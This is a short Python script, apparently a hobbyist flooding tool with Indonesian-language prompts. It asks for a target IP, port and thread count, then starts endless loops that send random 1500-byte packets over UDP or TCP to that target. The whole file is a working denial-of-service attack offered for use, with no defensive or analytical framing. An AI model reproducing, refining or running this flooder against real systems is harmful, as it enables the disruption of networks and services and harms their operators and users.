#!/usr/bin/env python3
#Code by Rence
import random
import socket
import threading

ip = str(input(" Target Ip:"))
port = int(input(" Target Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Paket yang dikirim ke target:"))
threads = int(input(" Threads yang dikirim:"))
def run():
	data = random._urandom(1500)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("PACKET DARI CJEY1557 %s TOK TOK BARANG SAMPAI IP %s DAN MEMBERI ROTI KEPORT %s!!"%(times,ip,port))
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(1500)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("PACKET DARI CJEY1557 %s TOK TOK BARANG SAMPAI IP %s DAN MEMBERI ROTI KEPORT %s!!"%(times,ip,port))
		except:
			s.close()
			print("[*] Error")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()